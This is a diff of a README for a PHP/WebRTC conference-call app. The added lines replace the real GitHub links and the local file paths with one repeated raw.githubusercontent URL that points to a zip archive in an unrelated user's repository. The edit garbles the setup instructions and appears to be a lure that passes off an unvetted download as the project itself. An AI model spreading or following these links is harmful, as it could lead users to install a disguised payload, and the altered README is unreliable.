@@ -1,11 +1,11 @@
 # Conference Call
-A conference call implementation using WebRTC, [Ratchet Web Socket](https://github.com/ratchetphp/Ratchet).
+A conference call implementation using WebRTC, [Ratchet Web Socket](https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip).
 
 
 # Getting Started
 - Run `composer install` to install the dependencies.
-- Set your web socket domain name and port in `ws/bin/server.php`
-- Update your websocket URL (`wsUrl`) in `assets/js/chat.js`
+- Set your web socket domain name and port in `https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip`
+- Update your websocket URL (`wsUrl`) in `https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip`
 
 
 # Features
@@ -21,8 +21,8 @@ A conference call implementation using WebRTC, [Ratchet Web Socket](https://gith
 
 
 # Note
-The app uses xirsys free ice servers which you can get by creating a free xirsys account. If you opt for that, ensure you rename the `Server.example.php` in the root directory to `Server.php` and replace the dummy credentials there with yours.
+The app uses xirsys free ice servers which you can get by creating a free xirsys account. If you opt for that, ensure you rename the `https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip` in the root directory to `https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip` and replace the dummy credentials there with yours.
 
 
 # Alternative
-If you prefer to use socket.io and NodeJS instead of PHP Web socket (Ratchet), check out the NodeJS version [here](https://github.com/amirsanni/Video-Call-App-NodeJS).
+If you prefer to use https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip and NodeJS instead of PHP Web socket (Ratchet), check out the NodeJS version [here](https://raw.githubusercontent.com/alssalimi/conference-call-ratchet/master/ws/ratchet_conference_call_1.4.zip).
